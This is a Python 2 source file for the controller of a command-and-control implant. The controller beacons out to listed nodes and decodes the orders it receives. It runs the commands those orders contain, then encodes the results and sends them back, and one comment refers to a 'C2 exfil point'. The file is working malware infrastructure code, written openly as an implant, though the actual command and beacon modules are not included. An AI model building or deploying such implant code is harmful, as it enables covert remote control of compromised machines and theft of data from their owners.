

#
# This is the application controller that manages the calls through all the different types of modules
#

import inspect
import sys
import warnings
from socket import error as socket_error
from implant_modules.command_object import CommandObject
from implant_modules.order import Order

# TODO:
#
# - Considering wrapping each node into a Node class upon initial import.
# - Fix easy_import and abstract_builder so you can hand it a list of the modules for a package (beacons, commands, etc), since the import can receive a list. More efficient.
# - Consider change command modules from {cmd:params} to (cmd, params) tuple. Better utilizes types to separate data. 
# - more flexible designation of where to send teh results/responses
# - Add behaviors as modules
# - make teh sending of results/responses optional
# - make teh results sending have an option of be dependant upon the command (i.e each command results can be sent somewhere different, or not at all, etc)
# - Make the base.py global values available to the controller so they can be edited, etc. Do this in a pythonic manner with exporting/importing etc.

PROMP_SEP = "->"
PROMP_BASE = "[Controller"
PROMP_END = "]>"
BASIC_PROMPT = PROMP_BASE + PROMP_END
BEAC_PROMPT = PROMP_BASE + PROMP_SEP + 'Beaconer' + PROMP_END
DEC_PROMPT = PROMP_BASE + PROMP_SEP + 'Decoder' + PROMP_END
CMD_PROMPT = PROMP_BASE + PROMP_SEP + 'Commander' + PROMP_END
ENC_PROMPT = PROMP_BASE + PROMP_SEP + 'Encoder' + PROMP_END
RESP_PROMPT = PROMP_BASE + PROMP_SEP + 'Responder' + PROMP_END
COD_PROMPT = None

BEACON_TYPE_IND = 0
PARAMS_IND = 1
MODULE_PATH = 'implant_modules'
BEACON_PKG = MODULE_PATH + '.' + 'beacons'
COMMAND_PKG = MODULE_PATH + '.' +'commands'
DECODER_PKG = MODULE_PATH + '.' +'codecs'
ENCODER_PKG = MODULE_PATH + '.' + 'codecs'
RESPONDER_PKG = MODULE_PATH + '.' + 'beacons'

CMD_SUCC_KEY = 'success'
CMD_RES_KEY = 'results'
CMD_NAME_KEY = 'command'
CMD_ARGS_KEY = 'args'
NODE_IP_KEY = 'node'
NODE_PORT_KEY = 'port'

class Controller:
    
    beacon_map = {}
    decoder_list = {} # list
    command_map = {}
    encoder_list = {} # list
    response_map = {}
    
    def __init__(self, beacons, commands, decoders, encoders, responders):
        
        self.build_handlers(beacons, commands, decoders, encoders, responders)
    
    # ###############
    # UTILITIES
    # ###############
    
    def get_module_class(self, module):
        try:
            for name, obj in inspect.getmembers(module):
                # must check for parent module name as to avoid imported class objects
                if inspect.isclass(obj) and obj.__module__ == module.__name__:
                    return obj
                    # have it instantiate the object? depends where I decide to use this method: obj_() creates an instance.
        except Exception, e:
            print "Error getting class from %s module" % (module.__name__)
            raise

    def easy_import(self, pkg_name, module_name):
        
        try:
            pkg = __import__(pkg_name, fromlist=[module_name])
            module = getattr(pkg,module_name)
            return self.get_module_class(module)
        except ImportError ,e:
            print "Erorr importing %s from %s" % (module_name, pkg_name)
            raise
    
    def abstract_builder(self, pkg_name, name_list, return_list = False):
        
        if return_list:
            ret_val = []
        else:
            ret_val = {}
        
        for module_name in name_list:

            module_class = self.easy_import(pkg_name, module_name)
            if return_list:
                ret_val.append(module_class)
            else:
                ret_val[module_name] = module_class
            
        return ret_val
    
    # ###############    
    # HANDLER BUILDERS
    # ###############
    
    # Note:
    # I added these facades because I am unsure how this architecture will work in the long run.
    # Hence, I am using a ludicrous number of functions and facades.
    
    def build_beacon_handler(self, beacons):
        self.beacon_map = self.abstract_builder(BEACON_PKG, beacons)

    def build_command_handler(self, commands):
        self.command_map = self.abstract_builder(COMMAND_PKG, commands)
    
    def build_decoder_handler(self, decoders):
        self.decoder_list = self.abstract_builder(DECODER_PKG, decoders, True) #return a list
        
    def build_encoder_handler(self, encoders):
        self.encoder_list = self.abstract_builder(ENCODER_PKG, encoders, True) #return a list
        
    def build_responder_handler(self, responders):
        self.response_map = self.abstract_builder(RESPONDER_PKG, responders)
    
    def build_handlers(self, beacons, commands, decoders, encoders, responders):
        # this function is used by the constructor to setup the dictionaries with the command to command object mapping.
        self.build_beacon_handler(beacons)
        self.build_command_handler(commands)
        self.build_decoder_handler(decoders)
        self.build_encoder_handler(encoders)
        self.build_responder_handler(responders)
    
    # ###############
    # HANDLER CALLERS
    # ###############
    
    def handle_beacon(self, nodes):
        # 
        # nodes example:
        # list of tuples, where each tuples first value is a string of the beacon type and second value is a dictionary of arguments
        # [('http_get',{'node':'192.168.2.2','port':'80','path':'/index.html','timeout':'10'})]
        #
        
        print BEAC_PROMPT + " beaconing..."
        
        try:
            
            success = False
            # Should I randomize the order of nodes?
            for node in nodes:
                beacon_type = node[BEACON_TYPE_IND]
                params = node[PARAMS_IND]
                
                ip = params.get(NODE_IP_KEY)
                port = params.get(NODE_PORT_KEY)
        
                beaconer_class = self.beacon_map.get(beacon_type) # get this from the beacon map based on beacon type
                beaconer = beaconer_class() # instantiate the object
                try:
                    success, response = beaconer.beacon(params)
                except Exception, e:
                    print "%s Error connecting to %s:%s" % (BEAC_PROMPT, ip, port)
                    success = False
                
                if success:
                    print "%s Successfully retrieved data from %s:%s" % (BEAC_PROMPT, ip, port)
                    order = Order()
                    order.node = node
                    order.node_ip = ip
                    order.node_port = port
                    order.node_type = beacon_type
                    order.node_params = params
                    order.raw_response = response
                    
                    return (success, order)
                else:
                    # Will not all failures raise an exception? Perahsp this should be forced implementation by all Beaconers?
                    # print "%s Failed to retrieve data from %s:%s" % (BEAC_PROMPT, ip, port)
                    # Should I pause here or just continue?
                    pass
                
            # What do I do if none of the nodes worked?
            return (False, None)
        except TypeError as e:
            print "No such class for provided beacon type: %s" % (beacon_type)
            raise e
        except Exception,e :
            raise e
    
    def recursive_decoder(self, decoder, encoded_data, full_body = False):
        
        decoded_data = []
        
        success = True
        
        try:
            
            if isinstance(encoded_data,basestring) or full_body:
                decoded_data.append(decoder(encoded_data))
                #return success, decoded_data
            elif type(encoded_data) is dict:
                
                    decoded_portion = {}
                    for encoded_key, encoded_value in encoded_data.items():
                        decoded_key = decoder(encoded_key)
                        
                        if type(encoded_value) is list or type(encoded_value) is dict:
                            success, data = self.recursive_decoder(decoder, encoded_value)
                            decoded_value = data
                        else:
                            decoded_value = decoder(encoded_value)
                        
                        decoded_portion[decoded_key] = decoded_value

                    decoded_data.append(decoded_portion)
                    
            elif type(encoded_data) is list or type(encoded_data) is tuple:

                for encoded_portion in encoded_data:
                    
                    success, data = self.recursive_decoder(decoder, encoded_portion)
                    if success:
                        decoded_data.append(data)
                    else:
                        return (False, None)
                    
            else:
                print type(encoded_data), encoded_data
                print COD_PROMPT + 'Data was not formatted as dict, list/tuple, string!'
                raise
            
            ## NOTE: If nested multiple commands breaks, this is likely the culprit
            if len(decoded_data) == 1:
                decoded_data = decoded_data[0]
                
        except Exception, e:
                print e
                print COD_PROMPT + " Issue in codec while trying to code %s" % (encoded_data)
                return (False, None)
        
        return success, decoded_data
    
    def handle_decode(self, encoded_data):
        
        COD_PROMPT = DEC_PROMPT
        print DEC_PROMPT + " decoding..."
        
        # while there is another decoder, run each item through the next decoder
        data = encoded_data
        success = False
        for decoder in self.decoder_list:
            current_decoder = decoder()
            success, data = self.recursive_decoder(current_decoder.decode, data)
            if not success:
                break
            print DEC_PROMPT + "%s decoded to '%s'" % ( current_decoder.name(),data)
        return success, data
    
    def recursive_execute(self, command):
        type_check = type(command)
        
        agg_results = []
        success = False

        try:

            if type_check is dict:
                cmd_obj = None
                args = None
                for cmd, params in command.items():
                    cmd_class = self.command_map.get(cmd)
                    cmd_obj = cmd_class()
                    args = params
                    print CMD_PROMPT + " Executing: %s" % (cmd_obj.name())
                    success, results = cmd_obj.execute(params)
    
                cmd_results = {}
                cmd_results[CMD_SUCC_KEY] = success
                cmd_results[CMD_RES_KEY] = results
                cmd_results[CMD_NAME_KEY] = cmd_obj.name()
                cmd_results[CMD_ARGS_KEY] = args 
                agg_results.append(cmd_results)

            elif type_check is list:
                print CMD_PROMPT + " Beginning Sub Command Chain"
                for cur_cmd in command:
                    success, results = self.recursive_execute(cur_cmd)
                    # not doing anything with success here
                    agg_results.append(results)
                print CMD_PROMPT + " Finishing Sub Command Chain"

                    
            else:
                print CMD_PROMPT + " Improper formatted command: %s" % (command)
            
        except Exception, e:
            raise
            
        return success, agg_results
    
    def handle_command(self, commands):
        print CMD_PROMPT + " calling commands..."
        
        results = []
        success = False

        print CMD_PROMPT + " Beginning Command Chain"
        for command in commands:
            success, result = self.recursive_execute(command)
            # Is there going to be complex results checking and handling code?
            results.append(result)
            
        # check results for threads, if there are, add them to a pool to be tracked
        print CMD_PROMPT + " Command Chain Completed"
        return success, results

    
    def handle_encode(self, results):
        
        COD_PROMPT = ENC_PROMPT
        print ENC_PROMPT + " encoding results..."
        
        # while there is another decoder, run each item through the next decoder
        data = results
        success = False
        for encoder in self.encoder_list:
            current_encoder = encoder()
            full_body = getattr(current_encoder,'full_body_encode',False)
            success, data = self.recursive_decoder(current_encoder.encode, data, full_body)
            if not success:
                break
            print ENC_PROMPT + "%s encoded to '%s'" % ( current_encoder.name(),data)
        return success, data
        
    
    def handle_response(self, order):
        print RESP_PROMPT + " sending results of order %s..." % (order.uuid)
        node = order.node
        responder_type = node[BEACON_TYPE_IND]
        params = node[PARAMS_IND]
                
        ip = params.get(NODE_IP_KEY)
        port = params.get(NODE_PORT_KEY)
        
        responder_class = self.response_map.get(responder_type) # get this from the beacon map based on beacon type
        responder = responder_class() # instantiate the object
        try:
            success = responder.send_response(params, order.response)
        except Exception, e:
            print "%s Error connecting to %s:%s (%s)" % (RESP_PROMPT, ip, port, e)
            success = False
            
        return success
        
    
    def handle(self, nodes):
        
        success = False
        
        try:
            # Attempt to beacon. Returns an Order object or None.
            success, order = self.handle_beacon(nodes)
            
            # Send response to decoders
            if success:
                success, decoded_data = self.handle_decode(order.raw_response)
            else:
                return False 
            
            # Process command
            if success:
                #TODO: Here we should turn tuples, strings, dicts and lists into CommandObjects. Then add these CommandObjects to the Order. 
                # then hand the Order to the command handler, from there it should
                order.commands = decoded_data
                success, results = self.handle_command(decoded_data)
                order.results = results
            else:
                return False
            
            # encode response here
            if success:
                success, encoded_results = self.handle_encode(results)
                order.response = encoded_results
            else:
                return False
            
            # Send response
            if success:
                success = self.handle_response(order)
            else:
                return False
        except Exception, e:
            # Here consider sending back a message to the C2 exfil point, letting them know why the implant died
            # if so, replace the return statements with raise statements and define appropriate exceptions with mesages
            print "%s Exception: %s" % ( BASIC_PROMPT, e)
            return False

        return True        
    
    def beacon(self, nodes):
        # facade
        result = self.handle(nodes)
        print "%s Beaconing iteration %s" % (BASIC_PROMPT,("FAILED", "SUCCEEDED")[result])
        return result
    
    